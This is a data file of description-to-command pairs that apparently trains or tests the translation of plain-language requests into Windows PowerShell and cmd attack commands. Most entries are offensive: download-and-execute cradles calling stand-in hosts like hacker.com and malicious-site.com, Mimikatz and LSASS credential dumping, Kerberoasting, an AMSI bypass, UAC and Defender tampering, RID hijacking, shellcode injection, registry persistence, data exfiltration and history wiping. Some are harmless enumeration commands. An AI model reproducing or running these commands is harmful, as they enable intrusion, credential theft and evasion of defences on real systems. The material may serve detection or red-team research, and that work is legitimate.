{"input": "Removes the history file associated with the PSReadline module.", "output": "Remove-Item (Get-PSReadlineOption).HistorySavePath"}
{"input": "Imports the 'powerview.ps1' module and retrieves information about users with admin count using PowerShell.", "output": "Import-Module .\\powerview.ps1 -Force; ; Get-NetUser -AdminCount | ConvertTo-Json -Depth 1"}
{"input": "Gets indexed items with specific values, filters, and paths, likely related to recorded TV.", "output": "Get-IndexedItem -Value 'title' -filter 'kind=recordedtv' -path \\Hitachi-engine\\Paul -recurse"}
{"input": "Imports the 'Invoke-DCOM.ps1' module.", "output": "Import-Module .\\Invoke-DCOM.ps1"}
{"input": "Adds a firewall rule to open a specified TCP port.", "output": "netsh advfirewall firewall add rule name=\"Opens Port to Any\" dir=in protocol=tcp localport=${port} action=allow profile=any"}
{"input": "Invokes DLL injection into a process with a specific ProcessID using a DLL named 'juve.dll'.", "output": "Invoke-DllInjection -ProcessID 8813 -Dll juve.dll"}
{"input": "Creates a new item at the specified path and removes an item, potentially related to TeamViewer log files.", "output": "New-Item -Path ${teamviewer_log_file} -Force | Out-Null ; Remove-Item ${teamviewer_log_file} -Force -ErrorAction Ignore"}
{"input": "Collects bookmark information for the user 'user1' in Internet Explorer.", "output": "Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user1"}
{"input": "Invokes a command on a remote computer to download and execute a malicious script from a specified URL.", "output": "Invoke-Command -ComputerName <Target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://hacker.com/malware/exploit')}"}
{"input": "Retrieves information about Windows user accounts using WMI.", "output": "Get-WmiObject -Class WinUserAccount"}
{"input": "Invokes shellcode with specific hexadecimal values.", "output": "Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)"}
{"input": "Attempts to perform RID Hijacking with specified user, RID, password, and enabling the attack.", "output": "Invoke-RIDHijacking -User Joe -RID 500 -Password Password1 -Enable"}
{"input": "Downloads and executes a remote script, followed by invoking Mimikatz to dump credentials.", "output": "IEX (New-Object Net.WebClient).DownloadString('${RemoteSc}'); Invoke-Mimikatz -DumpCreds"}
{"input": "Downloads and executes a PowerShell script from a specified URL with hidden window style.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-url')\""}
{"input": "Defines a path to a Windows executable and executes it with a specified remote URL.", "output": "$imewdbled = $env:SystemRoot + \"\\System32\\IME\\SHARED\\IMEWDBLD.exe\" ; & $imewdbled ${remote_url}"}
{"input": "Executes multiple commands using cmd.exe, appending results to a history log file.", "output": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log; ; cmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log; ; cmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log"}
{"input": "Executes a malicious PowerShell script located at \"C:\\MaliciousScript.ps1\" with specific execution policies and settings.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -File \"C:\\MaliciousScript.ps1\""}
{"input": "Downloads and executes a PowerShell script from a potentially malicious URL with specific settings.", "output": "powershell.exe -exec bypass -nop -c \"iex (New-Object Net.WebClient).DownloadString('http://threatSys.it/badKern32.ps1')\""}
{"input": "Invokes a command (payload) on a remote computer.", "output": "Invoke-Command -ComputerName <target> -ScriptBlock { <payload> }"}
{"input": "Executes a PowerShell script located at \"C:\\evilFail.ps1\" with specific execution policies.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\\evilFail.ps1"}
{"input": "Retrieves information about the current user.", "output": "whoami"}
{"input": "Downloads a PowerShell script using cURL and executes it using Invoke-Expression.", "output": "Invoke-Expression -Command \"curl http://host.com/malicious-script.ps1 | iex\""}
{"input": "Modifies an AMSI-related field to disable AMSI in PowerShell.", "output": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"}
{"input": "Downloads and executes a PowerShell script from a specified URL with specific settings.", "output": "powershell.exe -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://someExample-site.com/Winscript.ps1')"}
{"input": "Defines excluded extensions and adds them to Windows Defender preferences.", "output": "$excludedExts= \"${excluded_exts}\" ; Add-MpPreference -ExclusionExtension $excludedExts"}
{"input": "Retrieves information about Active Directory computers with no specific filter.", "output": "Get-AdComputer -Filter"}
{"input": "Executes FoxDump to retrieve information about passwords and saves the output to a file.", "output": "Get-FoxDump -OutFile 'passwords.txt'"}
{"input": "Purges Kerberos tickets and executes Kerberoasting with specified flags, outputting the result to a file.", "output": "klist purge ; cmd.exe /c \"${l_folder}${l_executable}\" kerberoast ${list_flags} /outfile:\"${l_folder}${Out_File}\""}
{"input": "Creates a new local user named \"Administrator\" with no password.", "output": "New-LocalUser -Name \"Administrator \" -NoPassword"}
{"input": "Appends information about processes to a log file.", "output": "get-process >> $env:APPDATA\\vmtools.log; ; cat $env:APPDATA\\vmtools.log"}
{"input": "Invokes shellcode with specific hexadecimal values.", "output": "Invoke-Shellcode -Shellcode @(0x90,0x8B,0xC3)"}
{"input": "Executes Mimikatz using PowerShell.", "output": "powershell.exe -c \"Invoke-Mimikatz\""}
{"input": "Executes a PowerShell script named 'WinDanger.ps1' with specific execution policies.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File WinDanger.ps1"}
{"input": "Invokes a CIM method on the Win32_Product class with specific arguments.", "output": "Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSIPayload}' }"}
{"input": "Executes a PowerShell script named 'Invoke-MimiKatz.ps1'.", "output": ".\\Invoke-MimiKatz.ps1"}
{"input": "Unblocks (removes the mark of the web) on a specified file path.", "output": "Unblock-File -Path ${file_path}"}
{"input": "Downloads and executes a PowerShell script from a specified URL.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://server.com/System.ps1')\""}
{"input": "Uses ADSI to search for computer objects in Active Directory.", "output": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()"}
{"input": "Downloads and executes a PowerShell script from a specified URL using Invoke-Expression.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://heavy.site.com/heavy_code.ps1')\""}
{"input": "Executes the \"Nightmare\" module to create a new user with a specified username, password, and driver name.", "output": "Invoke-Nightmare -NewUser 'caleb' -NewPassword 'password' -DriverName 'driver'"}
{"input": "Encodes a base64 string and assigns it to the variable '$b'.", "output": "$b = [System.Text.Encoding]::Unicode.GetBytes('IyEvdXNyL')"}
{"input": "Downloads and executes a PowerShell script from a specified URL using Invoke-Expression.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://hack.site.com/code.ps1')\""}
{"input": "Defines and invokes the Mimikatz command using Invoke-Expression.", "output": "$command = \"Invoke-Mimikatz -DumpCreds\"; Invoke-Expression -Command $command;"}
{"input": "Invokes a command on a remote system using PowerShell remoting.", "output": "Invoke-Command -ComputerName <target_system> -ScriptBlock { <command> }"}
{"input": "Executes Mimikatz to dump credentials with specific execution policies.", "output": "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Gets indexed items with specific filtering conditions and keywords.", "output": "Get-IndexedItem -Filter Contains(,'Stingray'), kind = 'picture', keywords='pin'"}
{"input": "Uses ping to send data to a specified IP address using content from a file.", "output": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"${ip_address}\", 1500, $Data) }"}
{"input": "Executes multiple commands to retrieve information about domain users and local group members.", "output": "net user /domain ; get-localgroupmember -group Users ; get-aduser -filter *"}
{"input": "Invokes a command on a remote computer to download and execute a malicious script from a specified URL.", "output": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-code')}"}
{"input": "Retrieves the current username from the environment variables.", "output": "$env:username"}
{"input": "Retrieves information about directory service computers using WMI.", "output": "get-wmiobject -class ds_computer -namespace root\\directory\\ldap"}
{"input": "Attempts to obtain system-level privileges using specific service and pipe names.", "output": "Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'"}
{"input": "Removes an item specified by the path and includes the '-Recurse' parameter to remove items in subdirectories.", "output": "Remove-Item -Path ${folder} -Recurse"}
{"input": "Create a new Hyper-V virtual machine named ${vm_name} with Generation 2, disable Secure Boot in its firmware settings, and start the virtual machine.", "output": "$VM = \"${vm_name}\" ; New-VM -Name $VM -Generation 2 ; Set-VMFirmware $VM -EnableSecureBoot Off ; Start-VM $VM"}
{"input": "Execute the Akagi64.exe tool with parameters '45' and 'C:\\Windows\\System32\\cmd.exe'.", "output": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe"}
{"input": "Run malicious code that displays a Windows Forms message box with the message 'Malicious Code'.", "output": "$code = @';[System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")[System.Windows.Forms.MessageBox]::Show(\"Malicious Code\")'; Invoke-Expression $code"}
{"input": "Run PowerShell with specific settings to execute a command stored in encoded form.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System]))\""}
{"input": "Retrieve all Active Directory groups without applying any filter.", "output": "Get-AdGroup -Filter *"}
{"input": "Download and execute a PowerShell script named 'Win32.ps1' from 'http://server.com/' using Invoke-Expression.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://server.com/Win32.ps1')\""}
{"input": "Perform DNS resolution by querying the specified volume of times (${query_volume}) for a randomly generated subdomain with the specified type (${query_type}) and domain (${domain}).", "output": "for($i=0; $i -le ${query_volume}; $i++) { Resolve-DnsName -type \"${query_type}\" \"${subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).${domain}\" -QuickTimeout}"}
{"input": "Create a new local user account with the specified username and no password.", "output": "New-LocalUser -Name \"${username}\" -NoPassword"}
{"input": "Disable User Account Control (UAC) by setting the EnableLUA registry key to 0.", "output": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force"}
{"input": "Remove the specified file from the system.", "output": "Remove-Item -path ${file_to_delete}"}
{"input": "Retrieve network configuration information for the system.", "output": "ipconfig"}
{"input": "Remove the specified file from the system.", "output": "Remove-Item -path ${file}"}
{"input": "Enumerate and display information about tokens on the system.", "output": "Invoke-TokenManipulation -Enumerate"}
{"input": "Inject and execute shellcode into the process with the specified ProcessId (1245).", "output": "Invoke-Shellcode -ProcessId 1245"}
{"input": "Display information about user accounts and policies on the network.", "output": "net accounts"}
{"input": "Set the execution policy for PowerShell scripts to Bypass at the local machine scope.", "output": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"}
{"input": "Execute a PowerShell script named 'evil_script.ps1' with specific execution settings.", "output": "powershell -ExecutionPolicy Bypass -NoProfile -File evil_script.ps1"}
{"input": "Enable various Windows Defender preferences, including runtime scanning and automatic sample submission.", "output": "Set-MpPreference -drtm $True ; Set-MpPreference -dbm $True ; Set-MpPreference -dscrptsc $True ; Set-MpPreference -dbaf $True"}
{"input": "Retrieve indexed items matching specified criteria within the specified path.", "output": "Get-IndexedItem -Value 'kind' -path \\Spare-engine\\Fede  -recurse"}
{"input": "Change directory to the temp folder and execute Kerbrute to perform user enumeration on the specified domain controller.", "output": "cd $env:temp ; .\\kerbrute.exe userenum -d ${Domain} --dc ${DomainController} $env:TEMP\\username.txt"}
{"input": "Retrieve the password for the site list.", "output": "Get-SiteListPassword"}
{"input": "Execute PowerShell with specific settings to download and execute a script from a specified URL.", "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/exeKern32.ps1')\""}
{"input": "Retrieve indexed items matching specific criteria, including filtering by content and keywords.", "output": "Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='iban'"}
{"input": "Import the Powerview module, retrieve NetUser information with SPN, and convert the output to JSON.", "output": "Import-Module .\\powerview.ps1 -Force; ; Get-NetUser -SPN | ConvertTo-Json -Depth 1"}
{"input": "Execute PowerShell with specific settings to download and execute a suspicious script from a specified URL.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil-site.url/sospicious_code.ps1');\""}
{"input": "Download and execute a PowerShell script named 'exploit.ps1' from a specified URL.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://exampleExploit.com/exploit.ps1');"}
{"input": "Invoke a command on a remote computer to download and execute a malicious script from a specified URL.", "output": "Invoke-Command -ComputerName <RemoteComputer> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/malicious.ps')}"}
{"input": "Create a memory dump of the LSASS process using rundll32.exe and comsvcs.dll.", "output": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full"}
{"input": "Invoke a command to download and execute a malicious PowerShell script using curl.", "output": "Invoke-Expression -Command \"& {curl http://malicious.example.com/malicious.ps1}\""}
{"input": "Perform RID Hijacking to impersonate the specified user (alice) with the specified RID, password, and enable the impersonation.", "output": "Invoke-RIDHijacking -User alice -RID 1002 -Password Password4 -Enable"}
{"input": "Perform RID Hijacking to impersonate the specified user (Max) with the specified RID and password.", "output": "Invoke-RIDHijacking -User Max -RID 500 -Password Max1"}
{"input": "Execute PowerShell with specific settings to download and execute a script from a specified URL with a hidden window.", "output": "powershell.exe -WindowStyle Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')\""}
{"input": "Invoke MS16-135 vulnerability to download and execute a payload from a specified URL.", "output": "Invoke-MS16135 -Command \"iex(New-Object Net.WebClient).DownloadString('http://google.com')\""}
{"input": "Execute PowerShell with specific settings to download and execute a heavy system script from a specified URL.", "output": "powershell.exe -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://heavy-server.com/heavySys.ps1')"}
{"input": "Download and execute a malicious payload from a specified URL, then start a process with the payload.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://example.maliciouswebsite.com/maliciouspayload.exe'); Start-Process maliciouspayload.exe"}
{"input": "Set a registry property to execute a specified binary along with the Userinit process during system startup.", "output": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, ${bin_to_execute}\" -Force"}
{"input": "Execute PowerShell with specific settings to invoke Mimikatz, a tool for extracting credentials from memory.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Mimikatz\""}
{"input": "Search for domain objects in the specified domain with a custom LDAP filter and retrieve specific properties.", "output": "Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'"}
{"input": "Retrieve Group Policy Objects (GPOs) from the domain and append the output to a specified file.", "output": "Get-GPO -Domain $ENV:userdnsdomain ${gpo_param} >> ${gpoutput}"}
{"input": "Start a notepad process, pass it through, and use it to run the Mimikatz command.", "output": "$process = Start-Process notepad.exe -PassThru $process.StandardInput.WriteLine('Invoke-Mimikatz')"}
{"input": "Invoke DCOM to execute the 'calc.exe' command on a remote computer using the MMC20.Application method.", "output": "Invoke-DCOM -ComputerName '192.168.2.100' -Method MMC20.Application -Command 'calc.exe'"}
{"input": "Execute a command using cmd.exe to perform asreproast with specific output file settings.", "output": "cmd.exe /c \"${LocalFolder}\\${local_executable}\" asreproast /outfile:\"${LocalFolder}\\${out_file}\""}
{"input": "Perform RID Hijacking to impersonate the specified user (Iris) with the specified RID and password.", "output": "Invoke-RIDHijacking -User Iris -RID 500 -Password Password1"}
{"input": "Create a new process for 'cmd.exe' using token manipulation with a specified thread ID (875).", "output": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 875"}
{"input": "Display NetBIOS name cache information.", "output": "nbtstat -n"}
{"input": "Create a new TCP client connection to the specified IP address.", "output": "$client = New-Object System.Net.Sockets.TCPClient(\"<IP address>\")"}
{"input": "Create a new process for 'cmd.exe' using token manipulation on the wininit process and wait for the process to exit.", "output": "(Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe' -PassThru).WaitForExit()"}
{"input": "Retrieve the current active user name and append it to a text file.", "output": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt  ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"}
{"input": "Retrieve indexed items matching specific criteria within the specified path, including filtering by kind and title.", "output": "Get-IndexedItem -Value 'title' -filter 'kind=recordedtv' -path \\atom-engine\\SuperUser  -recurse"}
{"input": "Invoke the PrintDemon vulnerability using the specified Base64-encoded payload.", "output": "Invoke-PrintDemon 'vAG4AUAB1CsAJABLACkAKQB8AEkARQBYAA=='"}
{"input": "Create a new WebClient object and configure proxy settings using the system's web proxy.", "output": "$Invoke = New-Object System.Net.WebClient; $Invoke.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $Invoke.Proxy.Credentials = [System.Net.CredentialCache]"}
{"input": "Execute PowerShell with specific settings to download and execute a script from a specified URL with hidden window style.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://sospiciousbad.url/threat)'\""}
{"input": "Retrieve indexed items matching specific criteria within the specified path, including filtering by stingray.", "output": "Get-IndexedItem -filter stingray -path OneIndex14:// -recurse"}
{"input": "Execute a PowerShell script named 'badProject.ps1' with specific execution settings.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File <badProject.ps1>"}
{"input": "Invoke Mimikatz to dump credentials on multiple specified computers.", "output": "Invoke-Mimikatz -DumpCreds -ComputerName @(computer1, computer2,computer3,computer4)"}
{"input": "Retrieve the default domain password policy from Active Directory.", "output": "get-addefaultdomainpasswordpolicy"}
{"input": "Invoke PowerShell to download and execute a malicious script from a specified URL using Invoke-WebRequest and Invoke-Expression.", "output": "Invoke-Expression -Command \"Invoke-WebRequest http://malicious.site/malicious_script.ps1 | Invoke-Expression\""}
{"input": "Compress the specified input files into a new archive at the specified destination with forced compression.", "output": "Compress-Archive -Path ${input_file} -DestinationPath ${output_file} -Force"}
{"input": "Execute PowerShell with specific settings to download and execute a malicious file from a specified URL with a hidden window.", "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousfile.ps1'); maliciousfile\""}
{"input": "Execute a command using cmd.exe to perform asreproast with specific output file settings.", "output": "cmd.exe /c \"${local_folder}\\${local_executable}\" asreproast /outfile:\"${local_folder}\\${out_file}\""}
{"input": "Copy the specified input file to the specified output file, start a process with the output file, get the process ID, and stop the process.", "output": "copy ${inputfile} ${outputfile} ; $myT1036_003 = (Start-Process -PassThru -FilePath ${outputfile}).Id ; Stop-Process -ID $myT1036_003"}
{"input": "Set the location to the specified folder, then execute a PowerShell script related to T1071.004 with specific parameters.", "output": "Set-Location PathToAtomicsFolder ; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain ${dom} -Subdomain ${subd} -QueryType ${QueryType}"}
{"input": "Retrieve information about the status of services on the system.", "output": "Get-Service"}
{"input": "Execute PowerShell with specific settings to download and execute a malicious script from a specified URL with hidden window style.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')\""}
{"input": "Retrieve the contents of the clipboard in raw format.", "output": "Get-Clipboard -raw"}
{"input": "Execute PowerShell with specific settings to download and execute a script from a specified URL with bypassed execution policy.", "output": "powershell.exe -nop -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')\""}
{"input": "Perform RID Hijacking to impersonate the specified user (David) with the specified RID, password, and enable the impersonation.", "output": "Invoke-RIDHijacking -User David -RID 500 -Password Password1 -Enable"}
{"input": "Invoke a command on a remote computer to download and execute a malicious script from a specified URL.", "output": "Invoke-Command -ComputerName <target_IP> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://sospiciousbad.url/threat')}"}
{"input": "Create a new registry property to disable the operational log for Windows Defender.", "output": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational  -PropertyType DWord -Value 0 -Force"}
{"input": "Execute a VBScript using the cscript interpreter.", "output": "cscript ${vbScript}"}
{"input": "Retrieve Active Directory users who do not require pre-authentication.", "output": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}"}
{"input": "Create a new WebClient object and download a file from a specified URL to a specified output location.", "output": "$url = \"http://sospiciousurl.org/malware.exe\";$output = \"C:\\Windows\\Temp\\malware.exe\";$client = new-object System.Net.WebClient"}
{"input": "Execute PetitPotam attack with specific parameters and print a message indicating the end of the attack.", "output": "& \"${petitpotam_path}\" ${captureServerIP} ${targetServerIP} ${efsApi} ; Write-Host \"End of PetitPotam attack\""}
{"input": "Create a minidump of the explorer process using Out-Minidump.", "output": "Get-Process explorer | Out-Minidump"}
{"input": "Send a POST request to a specified IP address with the content of the specified input file.", "output": "Invoke-WebRequest -Uri ${ipAddress} -Method POST -Body ${INPUT_file}"}
{"input": "Execute a payload with a specific identifier and perform a scan.", "output": ".\\${payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan"}
{"input": "Execute PowerShell script using Invoke-CradleCrafter to download and execute 'calc.exe' payload from a specified listener.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"Invoke-CradleCrafter -Payload 'calc.exe' -Listener <YourListener>\""}
{"input": "Execute a PowerShell command with parameters to bypass execution policies, hide the window, and execute encoded command.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAACAAAAEAAhAAAABAAEAAABAAAAAIAAAAAAAAAAAAAAAAAAAAACAAAA"}
{"input": "Execute a command using variables 'renamedBinary' and 'XmlPayload' with output redirected to 'output.txt'.", "output": "${renamedBinary} ${XmlPayload} output.txt"}
{"input": "Download and execute a PowerShell script from a specified URL using Invoke-Expression.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://not-a-good-example.com/malicious.ps1')\""}
{"input": "Retrieve information about the PowerShell version by accessing the $PSVersionTable variable.", "output": "$PSVersionTable"}
{"input": "Invoke the execution of a command using PowerShell's Invoke-Expression, running a potentially malicious file located at 'C:\\Windows\\temp\\bad_file.exe'.", "output": "Invoke-Expression -Command \"& {C:\\Windows\\temp\\bad_file.exe}\""}
{"input": "Start a new process using the Start-Process cmdlet with the specified script path stored in the variable 'Scrip_Path'.", "output": "Start-Process ${Scrip_Path}"}
{"input": "Download and execute a PowerShell script from a specified URL using Invoke-Expression with bypassed execution policy.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')\""}
{"input": "Download and execute a malicious payload using Invoke-Expression and initiate a new process with the payload using Start-Process.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciouspayload.exe'); Start-Process maliciouspayload.exe"}
{"input": "Set PowerShell ReadLine options to disable adding commands to the history.", "output": "Set-PSReadLineOption -AddToHistoryHandler { return $false }"}
{"input": "Execute a hidden PowerShell command with bypassed execution policy to download and execute a script from a specified malicious site.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com')\""}
{"input": "Copy Firefox profiles to a temporary location.", "output": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination $env:temp -Force -Recurse"}
{"input": "Invoke NinjaCopy to remotely copy a file to another location.", "output": "Invoke-NinjaCopy -Path 'C:\\windows\\psdrt\\psdrt.dit' -RemoteDestination 'c:\\windows\\temp\\psdrt.dit' -ComputerName 'Server1'"}
{"input": "Invoke Expression to download and execute a script from a malicious website.", "output": "Invoke-Expression -Command ï¿½IEX (New-Object Net.WebClient).DownloadString('http://veryEvil.com/evilKern32.ps1')"}
{"input": "Download and execute a PowerShell script from a malicious domain.", "output": "powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/maliciousscript.ps1')\""}
{"input": "Import PowerView module and invoke ShareFinder with specified parameters.", "output": "Import-Module $env:TEMP\\PowerView.ps1 ; Invoke-ShareFinder ${parameters}"}
{"input": "Invoke ExecuteMSBuild on a remote computer to download and execute a payload.", "output": "Invoke-ExecuteMSBuild -ComputerName 'napoli.vita.org' -Command IEX (New-Object net.webclient).DownloadString('http://www.getyourpowershellhere.com/payload')"}
{"input": "Invoke MS16-032 vulnerability exploitation.", "output": "Invoke-MS16-032"}
{"input": "Run Nmap scan on a specified host.", "output": "nmap ${HOST}"}
{"input": "Invoke a command with a potentially malicious script block on a target machine.", "output": "Invoke-Command -ComputerName <target_machine> -ScriptBlock { <bad_code> }"}
{"input": "Invoke a command with a potentially malicious script block on a target machine.", "output": "Invoke-Command -ComputerName <TargetName> -ScriptBlock {<malicious code >}"}
{"input": "Create a new web global module with specified name and DLL path.", "output": "New-WebGlobalModule -Name ${ModuleName} -Image ${DLLpath}"}
{"input": "Azure login and delete an AD user with specified user principal name.", "output": "az login ; $userprincipalname = \"${userprincipalname}\" ; az ad user delete --id $userprincipalname"}
{"input": "Invoke a potentially malicious script block on a target system.", "output": "Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('https://malicious_script.ps1')}"}
{"input": "Invoke a potentially malicious script block on a specified target.", "output": "Invoke-Command -ComputerName $target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://villain_server/evil_script.ps1')}"}
{"input": "Search for Active Directory groups using ADSI searcher.", "output": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()"}
{"input": "Start a process based on the results of a filtered and sorted indexed item search.", "output": "start (Get-IndexedItem -filter stingray -path OneIndex14:// -recurse -first 1 -orderby rank)"}
{"input": "Perform a domain password spray attack using the password \"Winter2016\".", "output": "Invoke-DomainPasswordSpray -Password Winter2016"}
{"input": "Download and execute a PowerShell script from a malicious website with hidden execution.", "output": "powershell.exe -nop -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciouscode.ps1');\""}
{"input": "Invoke Mimikatz to dump credentials using PowerShell.", "output": "powershell.exe -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Modify registry to create a Run key with a specified value.", "output": "$RunKey = \"${reg_key_path}\" ; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"${reg_key_value}\""}
{"input": "Download and execute a malicious payload from a specified website.", "output": "IEX (New-Object Net.WebClient).DownloadString('http://malicious-website.com/malicious-payload.exe');"}
{"input": "Invoke expression to execute code from a specified file.", "output": "Invoke-Expression ${file_in}"}
{"input": "Invoke RID Hijacking with specified options.", "output": "Invoke-RIDHijacking -UseHost -RID 500"}
{"input": "Map a network drive using specified credentials.", "output": "net use \\\\${remote.host.fqdn}\\C$ /user:${domain.user.name} ${domain.user.password}"}
{"input": "Get indexed items with a specific value from a specified path and recurse.", "output": "Get-IndexedItem -Value 'kind' -path \\atom-engine\\users  -recurse"}
{"input": "Invoke Mimikatz to dump credentials with specified PowerShell options.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -Command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Invoke Mimikatz to dump credentials using PowerShell with specified options.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -Command \"& {Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds'}\""}
{"input": "Use WMIC to get process information and append it to a log file.", "output": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log; ; cat $env:APPDATA\\vmtools.log"}
{"input": "Invoke REST method to retrieve metadata and convert it to JSON, then save it to an output file.", "output": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > ${output_file}"}
{"input": "Download and execute code from a specified website with hidden execution.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"iex(New-Object Net.WebClient).DownloadString('http://root-goal.com/someCode)\""}
{"input": "Get information about TCP connections using PowerShell.", "output": "Get-NetTCPConnection"}
{"input": "Create a code snippet and invoke it as a script block.", "output": "$code=@\"Invoke-Expression -Command 'Invoke-Mimikatz -DumpCreds' \"@; Invoke-Command -ScriptBlock $code"}
{"input": "Download and execute a malicious script from a specified website with bypass execution policy.", "output": "powershell.exe -ep bypass -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-script')\""}
{"input": "Download and execute a malicious script from a specified website with hidden window style.", "output": "powershell.exe -exec bypass -windowstyle hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://badexample.site/badscript.ps1')\""}
